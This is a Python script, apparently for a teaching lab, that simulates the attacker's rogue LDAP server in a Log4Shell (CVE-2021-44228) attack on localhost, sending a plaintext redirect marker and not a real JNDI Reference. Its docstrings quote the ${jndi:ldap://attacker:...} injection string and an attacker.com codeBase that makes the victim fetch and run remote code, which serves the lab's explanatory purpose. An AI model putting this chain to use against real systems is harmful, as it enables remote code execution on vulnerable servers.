"""
Log4Shell Simulation - Malicious LDAP Referral Server
======================================================
This simulates the attacker's rogue LDAP server.

When Log4j resolves ${jndi:ldap://attacker:1389/Exploit}, it connects
to this server. The server responds with a JNDI Reference that tells
the victim's JVM to download a remote Java class from the attacker's
HTTP server — enabling Remote Code Execution.

CVE-2021-44228  |  CVSS 10.0 (Critical)
"""

import socket
import struct
import threading
import sys

# ─── Configuration ───────────────────────────────────────────────────────────
LDAP_PORT        = 1389
HTTP_PAYLOAD_URL = "http://127.0.0.1:8888/Exploit.class"

# ─── ANSI Colours ────────────────────────────────────────────────────────────
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
DIM    = "\033[2m"
RESET  = "\033[0m"


def craft_ldap_response():
    """
    Craft a minimal LDAP SearchResultEntry that includes a JNDI Reference
    pointing the victim to our malicious HTTP server.

    In a real Log4Shell attack, this LDAP response contains a serialised
    javax.naming.Reference object with:
      - className:    "Exploit"
      - codeBase:     "http://attacker.com:8888/"
      - factoryName:  "Exploit"

    The victim's JVM then fetches Exploit.class from the attacker's HTTP
    server and instantiates it — achieving Remote Code Execution.

    For this simulation we send a plaintext marker that the victim script
    can parse, since we're not using a real LDAP client.
    """
    # We send a simple redirect payload the victim can parse
    redirect_payload = f"JNDI_REDIRECT:{HTTP_PAYLOAD_URL}\n"
    return redirect_payload.encode("utf-8")


def handle_victim_connection(conn, addr):
    """Handle an incoming LDAP lookup from the victim's simulated Log4j."""
    print(f"\n{YELLOW}{'─'*60}{RESET}")
    print(f"{RED}{BOLD}⚡ INCOMING JNDI LOOKUP FROM VICTIM{RESET}")
    print(f"{YELLOW}{'─'*60}{RESET}")
    print(f"  {DIM}Source:{RESET}  {addr[0]}:{addr[1]}")

    try:
        # Read the victim's LDAP bind/search request
        request_data = conn.recv(4096).decode("utf-8", errors="replace")
        print(f"  {DIM}Request:{RESET} {request_data.strip()}")

        # Craft and send the malicious LDAP referral
        print(f"\n  {CYAN}[→] Sending LDAP referral response...{RESET}")
        print(f"  {DIM}Redirecting victim to:{RESET}")
        print(f"      {RED}{BOLD}{HTTP_PAYLOAD_URL}{RESET}")

        response = craft_ldap_response()
        conn.sendall(response)

        print(f"\n  {GREEN}[✓] Referral sent successfully!{RESET}")
        print(f"  {DIM}The victim's JVM will now fetch the malicious class{RESET}")
        print(f"  {DIM}from our HTTP payload server...{RESET}")
    except Exception as e:
        print(f"  {RED}[✗] Error handling connection: {e}{RESET}")
    finally:
        conn.close()
    print(f"{YELLOW}{'─'*60}{RESET}")


def main():
    print(f"""
{RED}{BOLD}╔══════════════════════════════════════════════════════════╗
║         MALICIOUS LDAP REFERRAL SERVER                   ║
║         Log4Shell (CVE-2021-44228) Simulation            ║
╚══════════════════════════════════════════════════════════╝{RESET}

{DIM}This server simulates the attacker's rogue LDAP endpoint.
When a vulnerable Log4j instance resolves a JNDI lookup,
this server redirects it to download a malicious Java class
from the attacker's HTTP server, enabling RCE.{RESET}
""")

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        server.bind(("127.0.0.1", LDAP_PORT))
    except OSError as e:
        print(f"{RED}[✗] Failed to bind to port {LDAP_PORT}: {e}{RESET}")
        print(f"{DIM}    Make sure nothing else is using this port.{RESET}")
        sys.exit(1)

    server.listen(5)
    print(f"{GREEN}[*] LDAP server listening on 127.0.0.1:{LDAP_PORT}{RESET}")
    print(f"{DIM}[*] Redirect target: {HTTP_PAYLOAD_URL}{RESET}")
    print(f"{YELLOW}[*] Waiting for JNDI lookups from vulnerable victims...{RESET}\n")

    try:
        while True:
            conn, addr = server.accept()
            thread = threading.Thread(
                target=handle_victim_connection, args=(conn, addr)
            )
            thread.daemon = True
            thread.start()
    except KeyboardInterrupt:
        print(f"\n{DIM}[*] Shutting down LDAP server.{RESET}")
    finally:
        server.close()


if __name__ == "__main__":
    main()
